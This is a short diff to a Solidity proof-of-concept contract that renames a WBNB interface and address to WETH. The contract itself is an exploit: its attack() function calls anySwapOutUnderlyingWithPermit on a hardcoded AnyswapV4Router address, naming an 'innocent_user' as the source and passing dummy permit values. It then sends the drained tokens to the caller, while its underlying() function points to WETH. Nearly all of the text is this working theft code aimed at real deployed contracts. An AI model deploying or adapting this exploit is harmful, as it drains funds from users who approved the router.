@@ -17,7 +17,7 @@ interface AnyswapV4Router {
     
 }
 
-interface WBNB {
+interface WETH {
 
     function approve(address guy, uint256 wad) external returns (bool);
 
@@ -35,13 +35,13 @@ contract poc{
 
     address AnyswapV4Router_Address = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
 
-    address WBNB_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address WETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
 
     function attack(address innocent_user, uint256 amount) public{
 
         AnyswapV4Router(AnyswapV4Router_Address).anySwapOutUnderlyingWithPermit(innocent_user,address(this),msg.sender,amount,100000000000000000000,0,"0x","0x",56);
 
-        WBNB(WBNB_Address).transfer(msg.sender, amount);
+        WETH(WETH_Address).transfer(msg.sender, amount);
 
     }
 
@@ -56,7 +56,7 @@ contract poc{
 
 
     function underlying() external view returns (address){
-        return WBNB_Address;
+        return WETH_Address;
     }
 
 }
